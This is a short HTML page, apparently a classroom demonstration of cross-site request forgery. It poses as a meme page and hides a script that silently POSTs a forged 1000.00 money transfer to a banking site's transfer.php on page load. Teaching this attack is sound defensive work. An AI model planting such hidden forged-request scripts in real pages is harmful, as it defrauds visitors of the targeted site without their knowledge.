<!DOCTYPE html>
<html>
  <head>
    <title>CSRF Example - Compromised Website</title>
    <meta name="author" content="Greg Baatard" />
    <meta name="description" content="Compromised website for CSRF example" />
    <link rel="stylesheet" type="text/css" href="../../example_stylesheet.css" />
  </head>
  <body>
    <h3>Web Dev Meme</h3>
    <img src="meme.jpg" style="margin: 20px; border: 2px solid black;" />
    <p><a href="index.php">Online Banking Website</a></p>
    
    <!-- Quietly perform a transfer by emulating the transfer form -->
    <script>
      data = new FormData();
      data.append('acc_num', '123456789');
      data.append('amount', '1000.00');
      data.append('reference', '#hacked');
      data.append('submit', 'Transfer');

      fetch('transfer.php', {method: 'POST', body: data});
    </script>
    
  </body>
</html>